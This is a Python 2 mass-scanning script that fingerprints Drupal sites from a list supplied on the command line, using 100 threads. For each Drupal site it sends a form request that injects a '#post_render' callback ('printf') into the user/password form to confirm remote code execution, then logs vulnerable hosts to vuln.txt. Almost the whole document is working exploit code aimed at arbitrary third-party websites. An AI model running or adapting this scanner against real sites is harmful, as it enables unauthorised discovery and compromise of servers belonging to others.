# Coded by Ahmed sultan (@0x4148)
import os
import workerpool
import requests
from lxml.html import fromstring
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
siteslistx=sys.argv[1]
temp="{0:10}"


def check_if_drupal(host):
	temp="{0:10}"
	headers = {
	'User-Agent': 'Firefox/58.0',
	'Accept-Language': 'en-US,en;q=0.5',
	}
	try:
		myopen = requests.get(host,timeout=5,allow_redirects=True,headers=headers)
	except:
		return 0
	response = myopen.text
	if response.find("sites/all/")!=-1:
		print temp.format("\033[95m + Drupal detected @ "+host+"\n\033[0m"),
		xx=open("drupal.txt","ab")
		xx.write(host+"\r\n")
		xx.close()
		return 1
	return 0

def is_vulnerable1(HOST):
	get_params = {'q':'user/password', 'name[#post_render][]':'printf', 'name[#markup]':'Jnkfoooo', 'name[#type]':'markup'}
	post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
	headers = {
	'User-Agent': 'Firefox/58.0',
	'Accept-Language': 'en-US,en;q=0.5',
	}
	r = requests.post(HOST, data=post_params, params=get_params,headers=headers)
	m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
	if m:
	    found = m.group(1)
	    get_params = {'q':'file/ajax/name/#value/' + found}
	    post_params = {'form_build_id':found}
	    r = requests.post(HOST, data=post_params, params=get_params)
	    if re.match(r'^Jnkfooo.*',r.text):
	    	print temp.format("\033[92m + "+HOST+" is vulnerable \033[0m\n"),
	    	pew=open("vuln.txt","ab")
	    	pew.write(HOST+"\r\n")
	    	pew.close()
	    	return 1
	    else:
	    	return 0

def scan(host):
	host=host.strip("\r\n")+"/"
	is_drupal=check_if_drupal(host)
	if is_drupal == 1:
		is_vulnerable1(host)

print "+ Drupal scanner module launched"
print "! Processing websites from "+siteslistx
siteslist=open(siteslistx,"r")
pool = workerpool.WorkerPool(size=100)
pool.map(scan, siteslist)
pool.shutdown()
pool.wait()
print "! Done"
sys.exit()
